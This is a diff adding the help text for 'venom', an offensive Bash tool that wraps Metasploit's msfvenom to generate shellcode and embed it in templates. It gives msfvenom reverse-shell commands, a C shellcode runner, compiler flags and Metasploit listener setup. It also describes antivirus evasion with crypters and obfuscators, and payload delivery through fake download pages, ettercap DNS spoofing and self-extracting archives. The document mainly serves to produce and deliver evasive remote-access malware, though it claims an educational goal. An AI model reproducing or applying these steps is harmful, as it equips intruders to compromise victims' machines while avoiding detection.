@@ -1,0 +1,280 @@
+---
+-- VENOM 1.0.12 - metasploit Shellcode generator/compiler/listener
+-- Author: peterubuntu10@sourceforge.net  [ r00t-3xp10it ]
+-- Suspicious-Shell-Activity (SSA) RedTeam develop @2016
+-- HomePage: http://sourceforge.net/u/peterubuntu10/profile/
+-- Codename: black mamba [ GPL licensed ]
+---
+---
+---
+-- [ DEPENDENCIES ]
+-- Zenity | Metasploit | GCC (compiler) | Pyinstaller (compiler)
+-- mingw32 (compiler) | pyherion.py (crypter) | wine (emulator)
+-- PEScrambler.exe (PE obfuscator) | apache2 (webserver)| winrar
+-- vbs-obfuscator (crypter) | encrypt_PolarSSL (crypter) and
+-- ettercap MitM+DNS_Spoof (venom domain name attack vector)
+--
+-- Venom.sh will download/install all dependencies as they are needed
+-- Adicionally as build shell/aux/setup.sh to help you install all venom
+-- tool dependencies (metasploit as to be manually installed)
+---
+---
+---
+-- [ HOW DOES VENOM.SH WORKS ? ]
+-- This script will use msfvenom (metasploit) to generate shellcode in 
+-- diferent formats ( c | python | ruby | dll | msi | hta | psh | vbs | php | java)
+-- then injects the shellcode generated into one template previous writen
+-- by me (example: python) "the python funtion will execute the shellcode
+-- into RAM" also uses compilers like gcc (gnu cross compiler) or mingw32
+-- or pyinstaller to build the stand-alone executable file, it also starts a
+-- multi-handler to recive the remote connection (shell or meterpreter)
+--
+-- 'venom generator' tool reproduces some of the technics used
+-- by Veil-Evasion.py, unicorn.py, powersploit.py, etc, etc, etc..
+-- But venom its not a fork of any of this tools because its writen
+-- using Bash contrary to those tools that uses Python, also
+-- remmenber that veil evasion does not build this formats:
+-- [.msi .hta .vbs .ps1 .dll .php .jar .pdf] payload formats...
+--
+-- "P.S. some payloads are undetectable by AV soluctions... yes!!!"
+-- One of the reasons for that its the use of a funtion to execute
+-- the 2º stage of shell/meterpreter directly into targets ram
+-- the other reazon its the use of external obfuscator/crypters.
+---
+---
+---
+-- [ HOW DO I DELIVER MY PAYLOADS TO TARGET HOST ? ]
+-- venom 1.0.11 (malicious_server) was build to take advantage of
+-- apache2 webserver to deliver payloads (lan) using a fake webpage
+-- writen in html that takes advantage of <iframe> <meta-http-equiv>
+-- or "<form>" tags to be hable to trigger payload download. Venom also
+-- gives you the ability to deliver your payloads in 2 diferent ways:
+--
+-- 1º - run shell/aux/setup.sh to config venom domain name
+-- attack vector (http://mega-upload.com) thats going to use
+-- ettercap (mitm+dns_spoof method) to redirect target traffic
+-- to our phishing webpage (IPv<4/6> configuration required)
+--
+-- 2º - use shell/aux/setup.sh to delete venom domain name
+-- attack vector and force venom.sh main tool to use default
+-- settings (http://<your ip adrr>) to deliver payloads using
+-- 'social engeneering' technic (send malicious URL to target)
+--
+---
+---
+---
+-- [ WHAT ARE THE FILES INSIDE TEMPLATES FOLDER ? ]
+-- The shellcode generated can not be executed by its own...
+-- It requires to be embedded into one template (example: batch)
+-- to be executed, So the files inside '/shell/templates' are
+-- templates previous writen by me using diferent languages like
+-- (C, batch, ruby, powershell, python, php, vbscript) to trigger
+-- the execution of shellcode directly into targets RAM.
+---
+---
+---
+-- [ WHAT ARE THE FILES TRIGGER.BAT FOR ? ]
+-- In some modules venom will build the payload and trigger.bat
+-- to 'trigger' the execution of payload when embedded into one
+-- winrar/SFX executable file "upon extraction". Venom gives you
+-- the ability to 'trigger' your payloads in 3 diferent ways:
+--
+-- 1º - paste the command provided by venom into target cmd
+-- 2º - copy bouth files (payload and trigger.bat) to target
+--      into the same directory and press twice in trigger.bat
+-- 3º - compress bouth files into one WinRar/sfx file
+--      send it to target, and press twice to execute it.
+---
+---
+---
+-- [ BUILDING SHELLCODE USING MSFVENOM DOES NOT FLAG AV DETECTIONS ? ]
+-- Let's take Veil-Evasion python payload (crypted) as example:
+-- 1º - veil uses msfvenom to build shellcode in C format
+-- 2º - then it embedded the shellcode source code into one template
+-- writen in pyhton language (the funtion will execute shellcode)
+-- 3º - uses 'pyherion.py' to encrypt the source code with one random
+-- AES key + base64 (all together = FUD) "My 'python/exe -> pyherion'
+-- module reproduces the same technic, by using the same crypter ;)"
+--
+-- So it depends of the crypters/obfuscators used to scramble the
+-- sourcecode and also the ability to execute the 2º stage of shell
+-- or meterpreter stager directly into targets ram (not touching disk)
+-- Another example is maligno tool that deliver payloads under https
+-- (SSL/TLS encrypted comunications) evading better AV detections.
+-- 'There are more technics, but they are not reproduced by venom'
+---
+---
+---
+-- [ HOW DOES MSFVENOM ACTUALLY BUILDS SHELLCODE ? ]
+-- The default way to generate a windows binary payload (.exe)
+-- using msfvenom is achieved through the -f switch (format) and -o (output name)
+-- ----------------------------------------------------------------------------------------------------------------------------------
+-- msfvenom -p payload-name LHOST=127.0.0.1 LPORT=666 -f exe -o payload.exe
+-- ----------------------------------------------------------------------------------------------------------------------------------
+-- But msfvenom allows us to build shellcode in diferent formats
+-- like: asp, aspx, aspx-exe, dll, elf, exe, exe-small, hta-psh
+-- macho, osx-app, psh, vba, vba-exe, vba-psh, vbs, bash, c
+-- java, perl, powershell, python, ruby, sh, vbscript.
+-- The complete list can be accessed using the follow core command:
+-- ---------------------------------------------------
+-- sudo msfvenom --help-formats
+-- ---------------------------------------------------
+-- now lets generate a simple shellcode of 'windows/shell/reverse_tcp'
+-- choosing powershell as output format "note that we will not use
+-- the switch -o (output name) option, this way the shellcode
+-- generated will only displays in the current terminal windows".
+-- using powershell as output format:
+-- ------------------------------------------------------------------------------------------------------------------------------------------
+-- msfvenom -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=666 -f powershell
+-- ------------------------------------------------------------------------------------------------------------------------------------------
+-- using java as output format:
+-- -------------------------------------------------------------------------------------------------------------------------------
+-- msfvenom -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=666 -f java
+-- -------------------------------------------------------------------------------------------------------------------------------
+-- using hex as output format:
+-- -------------------------------------------------------------------------------------------------------------------------------
+-- msfvenom -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=666 -f hex
+-- -------------------------------------------------------------------------------------------------------------------------------
+---
+---
+---
+-- [ EMBBEDED SHELLCODE INTO ONE FUNTION (TEMPLATE) ]
+-- Lets build shellcode in C format to serve as example (unix targets)
+-- -------------------------------------------------------------------------------------------------------------------------------
+-- msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=666 -f c
+-- -------------------------------------------------------------------------------------------------------------------------------
+--
+-- Lets build our 'template' in C language to be embbeded with our shellcode
+-- -------------------------------------------------------------------------------------------------------------------------------
+-- #include<stdio.h>
+-- #include<string.h>
+--
+-- // Our Meterpreter (shellcode) code goes here
+-- unsigned char buf[]=
+-- "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
+-- "\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
+--
+-- // Push Meterpreter (shellcode) into memory
+-- int main(void) { ((void (*)())buf)();}
+-- -------------------------------------------------------------------------------------------------------------------------------
+-- Lets compile the template in C (using GCC) into one 'executable file'
+-- gcc -fno-stack-protector -z execstack <template.c> -o <outfile>
+--
+-- Lets start one listener to recive the remote connection:
+-- msf > use exploit/multi/handler
+-- msf (handler) > set LHOST 127.0.0.1
+-- msf (handler) > set LPORT 666
+-- msf (handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
+-- msf (handler) > exploit
+--
+-- Lets execute our payload (unix systems) open terminal and write:
+-- chmod +x payload-name && sudo ./payload-name
+---
+---
+---
+-- [ WHY PYINSTALLER DOES NOT WORK UNDER MY DISTRO ? ]
+-- pyinstaller needs certain dependencies to be installed
+-- under wine, sutch as: python-2.6.6 and pywin32 to work.
+-- the problem is that the dependencies needed must be
+-- based into attackers machine arch and chiptech brand
+-- (x86 | x64 | AMD | INTEL), for manually install it
+-- just unpack 'shell/obfuscate/pyinstaller-2.0.tar.gz'
+-- and follow the instructions inside readme-pedr0.txt
+-- pyinstaller command used by this script:
+-- -------------------------------------------------------------------------------------------------------
+-- su <user_name> -c 'pyinstaller --noconsole --onefile <spec_file>'
+-- -------------------------------------------------------------------------------------------------------
+---
+---
+---
+-- [ HOW CAN I USE PESCRAMBLER.EXE ? ]
+-- PEScrambler.exe is a windows binary executable file
+-- and like pyinstaller does not run under 'root user acc'
+-- if you wish to use it then open an terminal windows
+-- and issue the follow command on it:
+-- -------------------------------------------------------------------------------------------------------
+-- su <user_name> -c 'wine pescrambler.exe -i <Infile.exe> -o <outfile.exe>'﻿
+-- -------------------------------------------------------------------------------------------------------
+-- "pescrambler.exe does not compile payloads to .exe format
+-- it will take an executable.exe and obfuscate the sourcecode
+-- to better evade AV detection rate (not very effective now)"
+---
+---
+---
+-- [ DESCRIPTION OF NATIVE CRYPTERS/COMPILERS ]
+-- pyherion.py = Python 'crypter' that builds an dynamic AES/base64
+-- encoded launcher (with a random key) that's decoded/decrypted
+-- into memory (RAM) and then executed, 'evading AV detections'.
+-- ---------------------------------------------------------------------------------------------
+-- python pyherion.py <file-to-crypt.py> <outfile.py>
+-- ---------------------------------------------------------------------------------------------
+--
+-- PEScrambler.exe =  obfuscate an existing .exe (PE obfuscator)
+-- --------------------------------------------------------------------------------------------------------------
+-- su <user_name> -c 'wine pescrambler.exe -i <Infile.exe> -o <outfile.exe>﻿'
+-- --------------------------------------------------------------------------------------------------------------
+--
+-- pyinstaller.py = compile an existing python file into one .exe
+-- -----------------------------------------------------------------------------------------------------------------------------
+-- su <user_name> -c 'pyinstaller --noconsole --onefile <file-to-be-compiled.py>'
+-- -----------------------------------------------------------------------------------------------------------------------------
+--
+-- gcc = gnu cross compiler to build unix executable files
+-- ---------------------------------------------------------------------------------------------------------------------------
+-- gcc -fno-stack-protector -z execstack <template.c> -o <outfile>
+-- ---------------------------------------------------------------------------------------------------------------------------
+--
+-- mingw32 = cross compiler to build .exe binary executable files
+-- ---------------------------------------------------------------------------------------------------------------------------
+-- i586-mingw32msvc-gcc <template.c> -o <outfile.exe> -mwindows
+-- ---------------------------------------------------------------------------------------------------------------------------
+--
+-- encrypt_PolarSSL = encrypt your payloads in base64+AES random key..
+-- ---------------------------------------------------------------------------------------------------------------------------
+-- python encrypt_payload_polar.py <password to generate AES> <infile>
+-- ---------------------------------------------------------------------------------------------------------------------------
+--
+--
+-- hta-to-javascript-crypter.html = obfuscate your .hta payload using javascript
+-- (special thanks to: 0xig3n)
+-- ---------------------------------------------------------------------------------------------------------------------------
+-- press twice in html file to execute it on browser
+-- ---------------------------------------------------------------------------------------------------------------------------
+--
+-- vbs-obfuscator = obfuscate your payload.vbs using ascii (only vbs payloads)
+-- ---------------------------------------------------------------------------------------------------------------------------
+-- python vbs-obfuscator.py <inFile.vbs> <outFile.vbs>
+-- ---------------------------------------------------------------------------------------------------------------------------
+--
+-- VBS-crypter.exe = encrypt your payload.vbs (special thanks to: suriya)
+-- ---------------------------------------------------------------------------------------------------------------------------
+-- only runs/works in windows systems :( but it will produce a fud vbs payload
+-- ---------------------------------------------------------------------------------------------------------------------------
+--
+-- crypter_vbs_1.0_by_the_dark_side = encrypt your payload.vbs
+-- ---------------------------------------------------------------------------------------------------------------------------
+-- su <user_name> -c 'wine fud.exe'
+-- ---------------------------------------------------------------------------------------------------------------------------
+---
+
+
+
+
+---
+-- [ FINAL NOTES ]
+-- The main goal of this tool its not to build 'FUD' payloads!... But to give to
+-- its users the first glance of how shellcode is build, embedded into one template
+-- (any language), obfuscated/crypted (e.g vbs-obfuscator) and compiled into one
+-- executable file, the goal of this project its to show how shellcode works...
+--
+---
+---
+-- [ SPECIAL THANKS/CREDITS TO ]:
+-- HD Moore (metasploit father) | Nick Harbour (PEScrambler.exe)
+-- @harmj0y (pyherion) | @G0tmi1k @chris truncker @harmj0y (ruby_stager)
+-- David Cortesi (pyinstaller) | astr0baby (reflective fud dll infection method)
+-- 0entropy (powershell poc's) | Matthew Graeber (powershell poc's)
+-- alor&naga (ettercap) | Liviu (encrypt_polarSSL) | Chaitanya (redteam_dev)
+-- Suriya Prakash (redteam_dev) | 0xyg3n (redteam_dev) ^_^
+----
+EOF
